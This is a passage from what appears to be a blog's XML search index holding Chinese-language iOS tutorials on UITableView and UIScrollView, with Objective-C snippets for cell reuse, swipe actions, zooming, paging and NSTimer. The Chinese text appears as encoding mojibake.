æ¯ä¸€ç»„çš„å°¾éƒ¨- (NSString *)tableView:(UITableView *)tableView titleForFooterInSection:(NSInteger)section tableViewçš„å¸¸è§è®¾ç½®12345678910111213141516171819202122// è®¾ç½®æ¯ä¸€è¡Œcellçš„é«˜åº¦self.tableView.rowHeight = 100;// è®¾ç½®æ¯ä¸€ç»„å¤´éƒ¨çš„é«˜åº¦self.tableView.sectionHeaderHeight = 50;// è®¾ç½®æ¯ä¸€ç»„å°¾éƒ¨çš„é«˜åº¦self.tableView.sectionFooterHeight = 50;// è®¾ç½®åˆ†å‰²çº¿é¢œè‰²self.tableView.separatorColor = [UIColor redColor];// è®¾ç½®åˆ†å‰²çº¿æ ·å¼self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone;// è®¾ç½®è¡¨å¤´æŽ§ä»¶self.tableView.tableHeaderView = [[UISwitch alloc] init];// è®¾ç½®è¡¨å°¾æŽ§ä»¶self.tableView.tableFooterView = [UIButton buttonWithType:UIButtonTypeContactAdd];// è®¾ç½®å³è¾¹ç´¢å¼•æ–‡å­—çš„é¢œè‰²self.tableView.sectionIndexColor = [UIColor redColor];// è®¾ç½®å³è¾¹ç´¢å¼•æ–‡å­—çš„èƒŒæ™¯è‰²self.tableView.sectionIndexBackgroundColor = [UIColor blackColor]; UITableViewCellUITableViewCellçš„å¸¸è§è®¾ç½®12345678910111213141516171819202122// è®¾ç½®å³è¾¹çš„æŒ‡ç¤ºæ ·å¼cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;// è®¾ç½®å³è¾¹çš„æŒ‡ç¤ºæŽ§ä»¶cell.accessoryView = [[UISwitch alloc] init];// è®¾ç½®cellçš„é€‰ä¸­æ ·å¼cell.selectionStyle = UITableViewCellSelectionStyleNone;// backgroundViewä¼˜å…ˆçº§ &gt; backgroundColor// è®¾ç½®èƒŒæ™¯è‰²cell.backgroundColor = [UIColor redColor];// è®¾ç½®èƒŒæ™¯viewUIView *bg = [[UIView alloc] init];bg.backgroundColor = [UIColor blueColor];cell.backgroundView = bg;// è®¾ç½®é€‰ä¸­çš„èƒŒæ™¯viewUIView *selectedBg = [[UIView alloc] init];selectedBg.backgroundColor = [UIColor purpleColor];cell.selectedBackgroundView = selectedBg; cellçš„å¾ªçŽ¯åˆ©ç”¨ä¼ ç»Ÿçš„å†™æ³•12345678910111213141516171819/** æ¯å½“æœ‰ä¸€ä¸ªcellè¦è¿›å…¥è§†é‡ŽèŒƒå›´å†…ï¼Œå°±ä¼šè°ƒç”¨ä¸€æ¬¡ */- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; static NSString *ID = @"wine"; // 1.å…ˆåŽ»ç¼“å­˜æ± ä¸­æŸ¥æ‰¾å¯å¾ªçŽ¯åˆ©ç”¨çš„cell UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:ID]; // 2.å¦‚æžœç¼“å­˜æ± ä¸­æ²¡æœ‰å¯å¾ªçŽ¯åˆ©ç”¨çš„cell if (!cell) &#123; cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:ID]; &#125; // 3.è®¾ç½®æ•°æ® cell.textLabel.text = [NSString stringWithFormat:@"%zdè¡Œçš„æ•°æ®", indexPath.row]; return cell;&#125; æ–°çš„å†™æ³•ï¼ˆæ³¨å†Œcellï¼‰12345678910111213141516171819NSString *ID = @"wine";- (void)viewDidLoad &#123; [super viewDidLoad]; // æ³¨å†ŒæŸä¸ªé‡ç”¨æ ‡è¯† å¯¹åº”çš„ Cellç±»åž‹ [self.tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:ID];&#125;- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath&#123; // 1.å…ˆåŽ»ç¼“å­˜æ± ä¸­æŸ¥æ‰¾å¯å¾ªçŽ¯åˆ©ç”¨çš„cell UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:ID]; // 2.è®¾ç½®æ•°æ® cell.textLabel.text = [NSString stringWithFormat:@"%zdè¡Œçš„æ•°æ®", indexPath.row]; return cell;&#125; cellçš„é«˜åº¦çš„æ–°çš„è®¡ç®—æ–¹å¼ iOS8æ–°å¢žåŠ é¢„ä¼°é«˜åº¦(self-sizing) 1234// å‘Šè¯‰tableViewæ‰€æœ‰cellçš„é«˜åº¦æ˜¯è‡ªåŠ¨è®¡ç®—çš„ï¼ˆæ ¹æ®è®¾ç½®çš„çº¦æŸï¼‰self.tableView.rowHeight = UITableViewAutomaticDimension;// è®¾ç½®ä¸€ä¸ªé¢„ä¼°å€¼self.tableView.estimatedRowHeight = 44 ; //44ä¸ºä»»æ„å€¼ è‡ªå®šä¹‰ä¸‹åˆ’çº¿ ä¸éœ€è¦åŽ»æŽ‰åŽŸæ¥çš„ä¸‹åˆ’çº¿ï¼Œå°±å¯ä»¥å®žçŽ°åœ¨æœ‰å†…å®¹çš„æ—¶å€™ï¼Œä¸‹é¢æ˜¾ç¤ºå‡ºä¸‹åˆ’çº¿ï¼Œæ²¡æœ‰å†…å®¹çš„åœ°æ–¹ä¸ä¼šå‡ºçŽ°ä¸‹åˆ’çº¿ã€‚ 12// æ·»åŠ åˆ†å‰²çº¿çš„å–å·§æ–¹æ³•self.tableView.tableFooterView = [[UIView alloc] init]; å¦ä¸€ç§è‡ªå®šä¹‰ä¸‹æ»‘çº¿çš„æ–¹å¼å°±æ˜¯åœ¨cellæœ€ä¸‹é¢è‡ªå®šä¹‰ä¸€ä¸ªé«˜åº¦ä¸º1çš„UIViewï¼Œè¿™ç§æ–¹æ³•éœ€è¦åŽ»æŽ‰åŽŸæ¥çš„ä¸‹åˆ’çº¿ã€‚ 12// åŽ»æŽ‰è‡ªå¸¦çš„åˆ†å‰²çº¿self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone; å¦‚ä½•åˆ©ç”¨xibå°è£…ä¸€ä¸ªcell æ–°å»ºä¸€ä¸ªxibæ–‡ä»¶æè¿°ä¸€ä¸ªcellçš„å†…éƒ¨ç»“æž„ æ–°å»ºä¸€ä¸ªæ–°çš„ç±»(ç»§æ‰¿è‡ªUITableViewCell) æ–°å»ºç±»çš„ç±»åæœ€å¥½è·Ÿxibçš„æ–‡ä»¶åä¿æŒä¸€è‡´ å°†xibä¸­çš„æŽ§ä»¶ å’Œè‡ªå®šä¹‰çš„ç±» è¿›è¡Œè¿žçº¿ æä¾›ä¸€ä¸ªç±»æ–¹æ³•å¿«é€Ÿè¿”å›žä¸€ä¸ªåˆ›å»ºå¥½çš„è‡ªå®šä¹‰çš„view(å±è”½ä»ŽxibåŠ è½½è¿™ä¸ªè¿‡ç¨‹) é€šè¿‡ä»£ç è‡ªå®šä¹‰cell(cellçš„é«˜åº¦ä¸ä¸€è‡´) æ–°å»ºä¸€ä¸ªç»§æ‰¿è‡ªUITableViewCellçš„ç±» é‡å†™initWithStyle:reuseIdentifier:æ–¹æ³•æ·»åŠ æ‰€æœ‰éœ€è¦æ˜¾ç¤ºçš„å­æŽ§ä»¶(ä¸éœ€è¦è®¾ç½®å­æŽ§ä»¶çš„æ•°æ®å’Œframe,å­æŽ§ä»¶è¦æ·»åŠ åˆ°contentViewä¸­)è¿›è¡Œå­æŽ§ä»¶ä¸€æ¬¡æ€§çš„å±žæ€§è®¾ç½®(æœ‰äº›å±žæ€§åªéœ€è¦è®¾ç½®ä¸€æ¬¡, æ¯”å¦‚å­—ä½“\å›ºå®šçš„å›¾ç‰‡) æä¾›2ä¸ªæ¨¡åž‹ æ•°æ®æ¨¡åž‹: å­˜æ”¾æ–‡å­—æ•°æ®\å›¾ç‰‡æ•°æ® frameæ¨¡åž‹: å­˜æ”¾æ•°æ®æ¨¡åž‹\æ‰€æœ‰å­æŽ§ä»¶çš„frame\cellçš„é«˜åº¦ cellæ‹¥æœ‰ä¸€ä¸ªframeæ¨¡åž‹(ä¸è¦ç›´æŽ¥æ‹¥æœ‰æ•°æ®æ¨¡åž‹) (é‡å†™setæ–¹æ³•) é‡å†™frameæ¨¡åž‹å±žæ€§çš„setteræ–¹æ³•: åœ¨è¿™ä¸ªæ–¹æ³•ä¸­è®¾ç½®å­æŽ§ä»¶çš„æ˜¾ç¤ºæ•°æ®å’Œframe frameæ¨¡åž‹æ•°æ®çš„åˆå§‹åŒ–å·²ç»é‡‡å–æ‡’åŠ è½½çš„æ–¹å¼(æ¯ä¸€ä¸ªcellå¯¹åº”çš„frameæ¨¡åž‹æ•°æ®åªåŠ è½½ä¸€æ¬¡) æ•°æ®åˆ·æ–° æ·»åŠ æ•°æ® åˆ é™¤æ•°æ® æ›´æ”¹æ•°æ® å…¨å±€åˆ·æ–°æ–¹æ³•(æœ€å¸¸ç”¨) å±å¹•ä¸Šçš„æ‰€æœ‰å¯è§†çš„celléƒ½ä¼šåˆ·æ–°ä¸€é 1[self.tableView reloadData]; å±€éƒ¨åˆ·æ–°æ–¹æ³• æ·»åŠ æ•°æ® 123NSArray *indexPaths = @[[NSIndexPath indexPathForRow:0 inSection:0], [NSIndexPath indexPathForRow:1 inSection:0]];[self.tableView insertRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationRight]; åˆ é™¤æ•°æ® 123NSArray *indexPaths = @[[NSIndexPath indexPathForRow:0 inSection:0], [NSIndexPath indexPathForRow:1 inSection:0]];[self.tableView deleteRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationMiddle]; æ›´æ–°æ•°æ®ï¼ˆæ²¡æœ‰æ·»åŠ å’Œåˆ é™¤æ•°æ®ï¼Œä»…ä»…æ˜¯ä¿®æ”¹å·²ç»å­˜åœ¨çš„æ•°æ®ï¼‰ 123NSArray *indexPaths = @[[NSIndexPath indexPathForRow:0 inSection:0], [NSIndexPath indexPathForRow:1 inSection:0]];[self.tableView relaodRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationMiddle]; å·¦æ»‘å‡ºçŽ°åˆ é™¤æŒ‰é’® éœ€è¦å®žçŽ°tableViewçš„ä»£ç†æ–¹æ³• 1234567891011121314151617181920/** * åªè¦å®žçŽ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå·¦æ»‘å‡ºçŽ°DeleteæŒ‰é’®çš„åŠŸèƒ½å°±æœ‰äº† * ç‚¹å‡»äº†â€œå·¦æ»‘å‡ºçŽ°çš„DeleteæŒ‰é’®â€ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³• */- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath&#123; // åˆ é™¤æ¨¡åž‹ [self.wineArray removeObjectAtIndex:indexPath.row]; // åˆ·æ–° [tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];&#125;/** * ä¿®æ”¹DeleteæŒ‰é’®æ–‡å­—ä¸ºâ€œåˆ é™¤â€ */- (NSString *)tableView:(UITableView *)tableView titleForDeleteConfirmationButtonForRowAtIndexPath:(NSIndexPath *)indexPath&#123; return @"åˆ é™¤";&#125; å·¦æ»‘å‡ºçŽ°Nä¸ªæŒ‰é’® éœ€è¦å®žçŽ°tableViewçš„ä»£ç†æ–¹æ³• 12345678910111213141516171819202122232425/** * åªè¦å®žçŽ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå·¦æ»‘å‡ºçŽ°æŒ‰é’®çš„åŠŸèƒ½å°±æœ‰äº† (ä¸€æ—¦å·¦æ»‘å‡ºçŽ°äº†Nä¸ªæŒ‰é’®ï¼ŒtableViewå°±è¿›å…¥äº†ç¼–è¾‘æ¨¡å¼, tableView.editing = YES) */- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath &#123;&#125;/** * å·¦æ»‘cellæ—¶å‡ºçŽ°ä»€ä¹ˆæŒ‰é’® */- (NSArray *)tableView:(UITableView *)tableView editActionsForRowAtIndexPath:(NSIndexPath *)indexPath&#123; UITableViewRowAction *action0 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleNormal title:@"å…³æ³¨" handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; NSLog(@"ç‚¹å‡»äº†å…³æ³¨"); // æ”¶å›žå·¦æ»‘å‡ºçŽ°çš„æŒ‰é’®(é€€å‡ºç¼–è¾‘æ¨¡å¼) tableView.editing = NO; &#125;]; UITableViewRowAction *action1 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleDefault title:@"åˆ é™¤" handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; [self.wineArray removeObjectAtIndex:indexPath.row]; [tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationAutomatic]; &#125;]; return @[action1, action0];&#125; è¿›å…¥ç¼–è¾‘æ¨¡å¼123// self.tabelView.editing = YES;[self.tableView setEditing:YES animated:YES];// é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›å…¥ç¼–è¾‘æ¨¡å¼æ—¶ï¼Œå·¦è¾¹ä¼šå‡ºçŽ°ä¸€æŽ’çº¢è‰²çš„â€œå‡å·â€æŒ‰é’® åœ¨ç¼–è¾‘æ¨¡å¼ä¸­å¤šé€‰1234567// ç¼–è¾‘æ¨¡å¼çš„æ—¶å€™å¯ä»¥å¤šé€‰self.tableView.allowsMultipleSelectionDuringEditing = YES;// è¿›å…¥ç¼–è¾‘æ¨¡å¼[self.tableView setEditing:YES animated:YES];// èŽ·å¾—é€‰ä¸­çš„æ‰€æœ‰è¡Œself.tableView.indexPathsForSelectedRows;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>UITableView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘å¸¸ç”¨æŽ§ä»¶ä¹‹UIScrollView]]></title>
    <url>%2Farchives%2F44d78c0d.html</url>
    <content type="text"><![CDATA[å¸¸ç”¨å±žæ€§1234567891011121314151617181920@property(nonatomic) CGPoint contentOffset;// è¿™ä¸ªå±žæ€§ç”¨æ¥è¡¨ç¤ºUIScrollViewæ»šåŠ¨çš„ä½ç½®@property(nonatomic) CGSize contentSize;// è¿™ä¸ªå±žæ€§ç”¨æ¥è¡¨ç¤ºUIScrollViewå†…å®¹çš„å°ºå¯¸ï¼Œæ»šåŠ¨èŒƒå›´ï¼ˆèƒ½æ»šå¤šè¿œï¼‰@property(nonatomic) UIEdgeInsets contentInset;// è¿™ä¸ªå±žæ€§èƒ½å¤Ÿåœ¨UIScrollViewçš„4å‘¨å¢žåŠ é¢å¤–çš„æ»šåŠ¨åŒºåŸŸ@property(nonatomic) BOOL bounces;// è®¾ç½®UIScrollViewæ˜¯å¦éœ€è¦å¼¹ç°§æ•ˆæžœ@property(nonatomic,getter=isScrollEnabled) BOOL scrollEnabled;// è®¾ç½®UIScrollViewæ˜¯å¦èƒ½æ»šåŠ¨@property(nonatomic) BOOL showsHorizontalScrollIndicator;// æ˜¯å¦æ˜¾ç¤ºæ°´å¹³æ»šåŠ¨æ¡@property(nonatomic) BOOL showsVerticalScrollIndicator;// æ˜¯å¦æ˜¾ç¤ºåž‚ç›´æ»šåŠ¨æ¡ UIScrollViewçš„ä½¿ç”¨æ­¥éª¤ åˆ›å»ºUIScrollView ç»™UIScrollViewæ·»åŠ å­æŽ§ä»¶ è¦æƒ³UIScrollViewå¯ä»¥æ»šåŠ¨,å¿…é¡»è®¾ç½®UIScrollViewçš„æ»šåŠ¨èŒƒå›´ 12// è®¾ç½®æ»šåŠ¨èŒƒå›´self.scrollview.contentSize = CGSizeMake(500, 500); æ³¨æ„ç‚¹ åƒä¸‡ä¸è¦ä½¿ç”¨subviewsæ¥èŽ·å–UIScrollviewä¸­çš„å­æŽ§ä»¶ã€‚ å› ä¸ºsubviewsä¸­åŒ…å«äº†UIScrollviewä¸­çš„æ»šåŠ¨æ¡ï¼Œè€Œä¸”æ»šåŠ¨æ¡çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ã€‚ é»˜è®¤æƒ…å†µä¸‹åªè¦UIScrollviewå¯ä»¥æ»šåŠ¨, å°±æœ‰å¼¹ç°§æ•ˆæžœ bounceså±žæ€§ç”¨äºŽè®¾ç½®UIScrollviewæ˜¯å¦æœ‰å›žå¼¹æ•ˆæžœ 1self.scrollview.bounces = NO; æ³¨æ„: alwaysBounceXXXå±žæ€§ä¸»è¦ç”¨äºŽè®¾ç½®UIScrollviewæ²¡æœ‰è®¾ç½®contentSizeçš„æƒ…å†µ å¦‚æžœUIScrollviewå·²ç»è®¾ç½®äº†contentSizeï¼Œé‚£ä¹ˆYESå’ŒNOæ²¡æœ‰åŒºåˆ« alwaysBounceXXXåº”ç”¨åœºæ™¯: ä¸‹æ‹‰åˆ·æ–° 12self.scrollview.alwaysBounceVertical = YES;self.scrollview.alwaysBounceHorizontal = YES; è®¾ç½®æ»šåŠ¨æ¡çš„æ ·å¼å’ŒæŽ§åˆ¶æ»šåŠ¨æ¡çš„æ˜¾ç¤º 12345// æ ·å¼self.scrollview.indicatorStyle = UIScrollViewIndicatorStyleWhite;// æ˜¯å¦æ˜¾ç¤ºself.scrollview.showsHorizontalScrollIndicator = NO;self.scrollview.showsVerticalScrollIndicator = NO; contentOffset åªè¦ç‚¹å‡»äº†æŽ§åˆ¶å™¨çš„viewç³»ç»Ÿå°±ä¼šè‡ªåŠ¨è°ƒç”¨ä¸‹é¢æ–¹æ³• 12345678910111213141516171819- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event&#123; // 1.ä¿®æ”¹UIScrollviewçš„contentOffsetå±žæ€§ /* // contentOffsetå°±æ˜¯ç”¨äºŽè®¾ç½®å†…å®¹çš„æ»šåŠ¨åç§»ä½ // è§„å¾‹: ç§»åŠ¨çš„è·ç¦» = "æŽ§ä»¶çš„å·¦ä¸Šè§’" - "å†…å®¹çš„å·¦ä¸Šè§’" // xç­‰äºŽè´Ÿæ•° --&gt; å³è¾¹ç§»åŠ¨ // xç­‰äºŽæ•´æ•° --&gt; å·¦è¾¹ç§»åŠ¨ // yç­‰äºŽè´Ÿæ•° --&gt; ä¸‹è¾¹ç§»åŠ¨ // yç­‰äºŽæ•´æ•° --&gt; ä¸Šè¾¹ç§»åŠ¨ // -100 = "æŽ§ä»¶çš„å·¦ä¸Šè§’" - "å†…å®¹çš„å·¦ä¸Šè§’" // 100 = "æŽ§ä»¶çš„å·¦ä¸Šè§’" - "å†…å®¹çš„å·¦ä¸Šè§’"// self.scrollview.contentOffset = CGPointMake(-100, 0);// self.scrollview.contentOffset = CGPointMake(100, 0);// self.scrollview.contentOffset = CGPointMake(0, -100); */ self.scrollview.contentOffset = CGPointMake(0, 100);&#125; ä»£ç† UIScrollViewåœæ­¢â€æ‹–æ‹½â€æ—¶è°ƒç”¨ æ³¨æ„ï¼šåœæ­¢æ‹–æ‹½å¹¶ä¸ä»£è¡¨åœæ­¢æ»šåŠ¨,ä¹Ÿå°±æ˜¯è¯´UIScrollViewæ»šåŠ¨æ˜¯æœ‰æƒ¯æ€§çš„\åœ¨scrollViewDidEndDraggingæ–¹æ³•ä¸­,æ˜¯æ²¡æœ‰åŠžæ³•å‡†ç¡®çš„ç›‘å¬åˆ°UIScrollViewä»€ä¹ˆæ—¶å€™åœæ­¢æ»šåŠ¨ã€‚ decelerateç­‰äºŽYESä»£è¡¨æœ‰æƒ¯æ€§, ä¼šç»§ç»­æ»šåŠ¨; å¦‚æžœç­‰äºŽNOä»£è¡¨æ²¡æœ‰æƒ¯æ€§ï¼Œä¼šåœæ­¢æ»šåŠ¨ã€‚ 123456789- (void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate&#123; NSLog(@"%s = %d", __func__, decelerate); // åˆ¤æ–­æ˜¯å¦æœ‰æƒ¯æ€§,å¦‚æžœæ²¡æœ‰æƒ¯æ€§æ‰‹åŠ¨è°ƒç”¨scrollViewDidEndDeceleratingå‘ŠçŸ¥å·²ç»å®Œå…¨åœæ­¢æ»šåŠ¨ if (decelerate == NO) &#123; [self scrollViewDidEndDecelerating:scrollView]; &#125;&#125; UIScrollViewåœæ­¢â€å‡é€Ÿâ€æ—¶è°ƒç”¨ scrollViewDidEndDeceleratingä¸ä¸€å®šä¼šè°ƒç”¨, åªæœ‰scrollViewæœ‰æƒ¯æ€§çš„æ—¶å€™æ‰ä¼šè°ƒç”¨ 123456- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView&#123; NSLog(@"%s", __func__); NSLog(@"åœæ­¢æ»šåŠ¨"); self.iv.alpha = 1.0;&#125; UIScrollviewç¼©æ”¾ æ­¥éª¤: æˆä¸ºUIScrollviewçš„ä»£ç†, é€šè¿‡ä»£ç†æ–¹æ³•å‘Šè¯‰UIScrollviewè¦ç¼©æ”¾å“ªä¸€ä¸ªå­æŽ§ä»¶ è®¾ç½®å­æŽ§ä»¶æœ€å¤§å’Œæœ€å°çš„ç¼©æ”¾æ¯”ä¾‹ å¸¸ç”¨æ–¹æ³• viewForZoomingInScrollView : è¿”å›žéœ€è¦ç¼©æ”¾çš„å­æŽ§ä»¶ scrollViewDidZoom: åªè¦å­æŽ§ä»¶è¢«ç¼©æ”¾äº†å°±ä¼šè°ƒç”¨(è°ƒç”¨é¢‘çŽ‡éžå¸¸é«˜) scrollViewDidEndZooming: ç¼©æ”¾å®Œæ¯•æ—¶æŽ‰ç”¨ å¦‚ä½•ä¿è¯è¢«ç¼©æ”¾çš„å­æŽ§ä»¶æ°¸è¿œå±…ä¸­ åªè¦å­æŽ§ä»¶çš„contentSizeå°äºŽUIScrollviewçš„å®½é«˜æ—¶æ‰éœ€è¦ç¼©æ”¾ ç¬¬ä¸€ç§123456789101112// 1.åˆ¤æ–­contentSizeçš„å®½é«˜, æ˜¯å¦å°äºŽUIScrollViewçš„frameçš„size if (scrollView.contentSize.width &lt; scrollView.bounds.size.width) &#123; self.iv1.center = CGPointMake(scrollView.bounds.size.width * 0.5, scrollView.bounds.size.height * 0.5); &#125; if (scrollView.contentSize.height &lt; scrollView.bounds.size.height) &#123; self.iv1.center = CGPointMake(scrollView.bounds.size.width * 0.5, scrollView.bounds.size.height * 0.5); &#125; ç¬¬äºŒç§123456789101112131415161718// 1.åˆ¤æ–­contentSizeçš„å®½é«˜, æ˜¯å¦å°äºŽUIScrollViewçš„frameçš„size if (scrollView.contentSize.width &lt; scrollView.bounds.size.width) &#123; // è®¡ç®—Xçš„å€¼ CGFloat x = (scrollView.contentSize.width * 0.5) + ((scrollView.bounds.size.width - scrollView.contentSize.width) * 0.5); // é‡æ–°è®¾ç½®center self.iv1.center = CGPointMake(x, self.iv1.center.y); &#125; if (scrollView.contentSize.height &lt; scrollView.bounds.size.height) &#123; // è®¡ç®—Yçš„å€¼ CGFloat y = (scrollView.contentSize.height * 0.5) + ((scrollView.bounds.size.height - scrollView.contentSize.height) * 0.5); // é‡æ–°è®¾ç½®center self.iv1.center = CGPointMake(self.iv1.center.x, y); &#125; ç¬¬ä¸‰ç§ (å¯¹ç¬¬äºŒç§æ–¹æ³•è¿›è¡Œç®€åŒ–)123CGFloat x = scrollView.contentSize.width &lt; scrollView.bounds.size.width ? (scrollView.bounds.size.width - scrollView.contentSize.width) * 0.5 : 0.0; CGFloat y = scrollView.contentSize.height &lt; scrollView.bounds.size.height ? (scrollView.bounds.size.height - scrollView.contentSize.height) * 0.5 : 0.0; self.iv1.center = CGPointMake(scrollView.contentSize.width * 0.5 + x, scrollView.contentSize.height * 0.5 + y); å›¾ç‰‡è½®æ’­å™¨ å¦‚ä½•åˆ†é¡µ : pagingEnabled = YES åˆ†é¡µçš„åŽŸç†: æ˜¯æ ¹æ®UIScrollviewçš„å®½åº¦æˆ–è€…é«˜åº¦æ¥åˆ†é¡µ UIPageControl numberOfPages : è®¾ç½®æ€»é¡µç  currentPage: è®¾ç½®å½“å‰é¡µç  pageIndicatorTintColor: è®¾ç½®å…¶å®ƒé¡µç çš„é¢œè‰² currentPageIndicatorTintColor : è®¾ç½®å½“å‰é¡µç çš„é¢œè‰² è‡ªå®šä¹‰é¡µç  åˆ©ç”¨KVCç»™UIPageControlè®¾ç½®é¡µç å›¾ç‰‡(ç§æœ‰å±žæ€§) 12[pageControl setValue:[UIImage imageNamed:@"current"] forKeyPath:@"_currentPageImage"]; [pageControl setValue:[UIImage imageNamed:@"other"] forKeyPath:@"_pageImage"]; ç›‘å¬UIPageControlçš„ç‚¹å‡» ç”±äºŽUIPageControlç»§æ‰¿äºŽUIControl, æ‰€ä»¥é€šè¿‡addTargtæ¥ç›‘å¬ 1[pageControl addTarget:self action:@selector(nextPage) forControlEvents:UIControlEventValueChanged]; åˆ‡æ¢é¡µç  æ»šåŠ¨å®Œæ¯•ä¹‹åŽå†åˆ‡æ¢ 12345678910111213141516171819- (void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate&#123; // åˆ¤æ–­æ˜¯å¦æœ‰æƒ¯æ€§, å¦‚æžœæ²¡æœ‰å°±æ‰‹åŠ¨è°ƒç”¨scrollViewDidEndDecelerating if (NO == decelerate) &#123; [self scrollViewDidEndDecelerating:scrollView]; &#125;&#125;// åªæœ‰æœ‰æƒ¯æ€§æ‰ä¼šè°ƒç”¨- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView&#123; // 1.åŠ¨æ€è®¡ç®—å½“å‰çš„é¡µç  // é¡µç  = UIScrollViewçš„åç§»ä½ / UIScrollViewçš„å®½åº¦ int page = scrollView.contentOffset.x / scrollView.bounds.size.width; NSLog(@"page = %d", page); // 2.è®¾ç½®å½“å‰çš„é¡µç  self.pageControl.currentPage = page;&#125; å®žæ—¶åˆ‡æ¢ ï¼ˆåŽŸç†ç›¸åŒ å®žçŽ°æ–¹å¼ä¸åŒçš„æ–¹æ³•ï¼‰ æ–¹å¼1 123456789101112// åªè¦æ»šåŠ¨å°±ä¼šè°ƒç”¨- (void)scrollViewDidScroll:(UIScrollView *)scrollView&#123;// NSLog(@"%s", __func__); // 1.åŠ¨æ€è®¡ç®—å½“å‰çš„é¡µç  // é¡µç  = UIScrollViewçš„åç§»ä½ / UIScrollViewçš„å®½åº¦ CGFloat page = scrollView.contentOffset.x / scrollView.bounds.size.width; NSLog(@"page = %f", page + 0.5); // 2.è®¾ç½®å½“å‰çš„é¡µç  self.pageControl.currentPage = (int)(page + 0.5);&#125; æ–¹å¼2 123456789// å½“æ­£åœ¨æ»šåŠ¨çš„æ—¶å€™å°±ä¼šè°ƒç”¨ä»£ç†çš„æ–¹æ³•- (void)scrollViewDidScroll:(UIScrollView *)imageScrollView&#123; // æ ¹æ®æ»šåŠ¨çš„ä½ç½®è®¡ç®—å‡ºå½“å‰çš„é¡µæ•° CGFloat scrollViewW = self.imageScrollView.frame.size.width; int page = (imageScrollView.contentOffset.x + scrollViewW * 0.5) / scrollViewW; self.pageControl.currentPage = page;&#125; NSTimerçš„ä½¿ç”¨ ä½œç”¨: å¯ä»¥è®©ç³»ç»Ÿæ¯éš”ä¸€æ®µæ—¶é—´æ‰§è¡ŒæŒ‡å®šå¯¹è±¡çš„æŒ‡å®šæ–¹æ³• æ³¨æ„: é—´éš”æ—¶é—´æ˜¯ä¸å‡†ç¡®çš„ åªè¦é€šè¿‡scheduledTimerWithTimeIntervalåˆ›å»ºå‡ºæ¥çš„Timer,å°±ä¼šè¢«RUNLOOPå¼ºå¼•ç”¨, æ‰€ä»¥å¦‚æžœé€šè¿‡å±žæ€§ä¿å­˜ä½¿ç”¨weak åªè¦è°ƒç”¨äº†NSTimerçš„invalidateæ–¹æ³•, é‚£ä¹ˆå®šæ—¶å™¨å°±ä¸èƒ½ä½¿ç”¨äº†, æƒ³è¦ä½¿ç”¨å¿…é¡»é‡æ–°åˆ›å»º å¦‚ä½•ä¸»çº¿ç¨‹æ­£åœ¨å¤„ç†å…¶å®ƒæ“ä½œ, é‚£ä¹ˆNSTimerä¸ä¼šæ‰§è¡Œ é»˜è®¤NSTimeræ˜¯NSDefaultRunLoopModeæ¨¡å¼ è¦æƒ³åœ¨ä¸»çº¿ç¨‹å¤„ç†å…¶å®ƒæ“ä½œçš„æ—¶å€™ä¹Ÿå¤„ç†NSTimer, é‚£ä¹ˆå¿…é¡»æŠŠNSTiemråœ¨RunLoopä¸­çš„æ¨¡å¼æ”¹ä¸ºNSRunLoopCommonModeså¼€å¯å®šæ—¶å™¨ 12345678@property (nonatomic, weak) NSTimer *timer;// è¿”å›žä¸€ä¸ªè‡ªåŠ¨å¼€å§‹æ‰§è¡Œä»»åŠ¡çš„å®šæ—¶å™¨self.timer = [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(nextPage:) userInfo:@"123" repeats:YES];// ä¿®æ”¹NSTimeråœ¨NSRunLoopä¸­çš„æ¨¡å¼ï¼šNSRunLoopCommonModes// ä¸»çº¿ç¨‹ä¸ç®¡åœ¨å¤„ç†ä»€ä¹ˆæ“ä½œï¼Œéƒ½ä¼šæŠ½æ—¶é—´å¤„ç†NSTimer[[NSRunLoop mainRunLoop] addTimer:self.timer forMode:NSRunLoopCommonModes]; 12345 // å¼€å¯å®šæ—¶å™¨(æ–¹å¼2) // è®¾ç½®å®šæ—¶å™¨çš„å¼€å§‹æ—¶é—´ä¸ºè¿‡åŽ»çš„æŸä¸€ä¸ªæ—¶é—´, ä¹Ÿå°±æ„å‘³ç€ç«‹åˆ»å¼€å§‹// [self.timer setFireDate:[NSDate distantPast]];// 